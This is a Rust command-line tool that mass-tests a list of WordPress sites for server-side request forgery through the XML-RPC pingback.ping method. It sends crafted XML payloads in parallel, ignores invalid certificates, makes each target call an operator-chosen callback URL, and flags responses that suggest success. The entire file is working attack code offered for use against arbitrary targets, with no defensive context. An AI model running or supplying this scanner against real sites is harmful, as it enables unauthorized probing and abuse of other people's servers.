use clap::Parser;
use futures::stream::{self, StreamExt};
use reqwest::Client;
use std::fs::File;
use std::io::{self, BufRead};
use std::sync::Arc;
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(author, version, about = "WordPress XML-RPC SSRF Parallel Tester")]
struct Args {
    
    /// target url file path (1line 1URL)
    #[arg(short, long)]
    list: String,

    /// reflected target
    #[arg(short, long)]
    callback: String,

    /// linked base URL (Source)
    #[arg(short, long)]
    source: String,

    /// multi thread count (default: 10)
    #[arg(short, long, default_value_t = 10)]
    concurrency: usize,
}


/// XML-RPC request
async fn test_xmlrpc(client: Arc<Client>, target: String, callback: String, source: String) {
    let xml_payload = format!(
        r#"<?xml version="1.0" ?>
        <methodCall>
          <methodName>pingback.ping</methodName>
          <params>
            <param><value><string>http://{}</string></value></param>
            <param><value><string>{}</string></value></param>
          </params>
        </methodCall>"#,
        callback,
        source
    );

    match client
        .post(&target)
        .header("Content-Type", "text/xml")
        .body(xml_payload)
        .send()
        .await
    {
        Ok(res) => {
            let status = res.status();
            
            // here is get the Body as text
            if let Ok(body) = res.text().await {
                
                if body.contains("<int>0</int>") {
                    println!("[!] [Suspicious!] SSRF Potentially Successful: {}", target);
                    println!("    -> Check your webhook");
                } else if body.contains("methodResponse") {
                    println!("[+] [{}] XML-RPC Response received (Not SSRF-specific).", target);
                } else {
                    println!("[*] [{}] Status: {}, Body length: {}", target, status, body.len());
                }
            }
        }
        Err(e) => {
            eprintln!("[{}] Error: {}", target, e);
        }
    }
}
#[tokio::main]
async fn main() -> io::Result<()> {
    let args = Args::parse();
    
    // load target list
    let file = File::open(&args.list)?;
    let reader = io::BufReader::new(file);
    let targets: Vec<String> = reader
        .lines()
        .filter_map(|line| line.ok())
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    println!("[*] Loaded {} targets.", targets.len());
    println!("[*] Callback URL: {}", args.callback);
    println!("[*] Source URL:   {}", args.source);

    
    // HTTP client configration
    let client = Arc::new(
        Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap(),
    );

    // multi threading stream
    let callback = Arc::new(args.callback);
    let source = Arc::new(args.source);
    
    let bodies = stream::iter(targets).map(|target| {
        let client = Arc::clone(&client);
        let cb = Arc::clone(&callback);
        let src = Arc::clone(&source);
        tokio::spawn(async move {
            test_xmlrpc(client, target, cb.to_string(), src.to_string()).await;
        })
    }).buffer_unordered(args.concurrency);

    bodies.collect::<Vec<_>>().await;

    println!("[+] All tests completed.");
    Ok(())
}
